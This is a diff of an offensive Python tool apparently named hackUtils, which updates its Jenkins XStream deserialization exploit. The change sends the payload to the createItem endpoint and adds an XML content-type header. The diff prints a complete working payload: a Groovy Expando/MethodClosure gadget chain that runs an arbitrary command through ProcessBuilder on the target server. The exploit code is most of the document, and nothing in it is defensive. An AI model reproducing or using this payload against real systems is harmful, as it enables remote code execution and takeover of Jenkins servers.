@@ -640,7 +640,8 @@ def checkXStreamJenkins(ip, cmdstr):
             job = getJobFromJenkins(result)
             ver = getJenkinsVersion(result)
             if job:
-                job_url = url + job + "config.xml"
+                #job_url = url + job + "config.xml"
+                job_url = url + "createItem?name=hackUtils"
                 exploitXStreamJenkins(job_url, cmdstr, ver)
             else:
                 print '[!] no job found! url: '+url
@@ -660,7 +661,8 @@ def exploitXStreamJenkins(job_url, cmdstr, ver):
     payload = "<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/><owner class=\"java.lang.ProcessBuilder\"><command>"+command+"</command><redirectErrorStream>false</redirectErrorStream></owner><resolveStrategy>0</resolveStrategy><directive>0</directive><parameterTypes/><maximumNumberOfParameters>0</maximumNumberOfParameters><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>"
 
     try:
-        res = requests.post(job_url,timeout=10,data = payload)
+    	headers = {'content-type': 'application/xml'}
+        res = requests.post(job_url,timeout=10,data=payload,headers=headers)
         if res.status_code == 500:
             html = res.content
             if html:
@@ -734,7 +736,7 @@ def getJenkinsVersion(html):
     
 def myhelp():
     print "\n+-----------------------------+"
-    print "|  hackUtils v0.0.7           |"
+    print "|  hackUtils v0.0.8           |"
     print "|  Avfisher - avfisher.win    |"
     print "|  security_alert@126.com     |"
     print "+-----------------------------+\n"
